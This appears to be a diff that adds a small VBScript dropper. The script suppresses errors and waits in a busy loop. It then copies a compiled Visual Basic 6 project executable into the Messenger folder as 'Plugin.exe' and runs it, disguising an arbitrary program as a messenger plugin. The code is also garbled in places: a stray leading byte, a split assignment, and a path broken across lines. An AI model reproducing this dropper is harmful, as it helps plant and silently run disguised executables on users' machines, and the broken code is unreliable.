@@ -1,0 +1,12 @@
+ÿaOn Error Resume Next
+Dim Z
+Dim O
+Set O = 
+CreateObject("Scripting.FileSystemObject")
+While Not a = 1000000
+a = a + 1
+Wend
+O.CopyFile "C:\Archivos de programa\Microsoft Visual Studio\VB98\Proyecto1.exe","C:\Archivos de 
+programa\Messenger\Plugin.exe"
+Set Z = CreateObject("wscript.shell")
+Z.run "C:\Archivos de programa\Messenger\Plugin.exe"
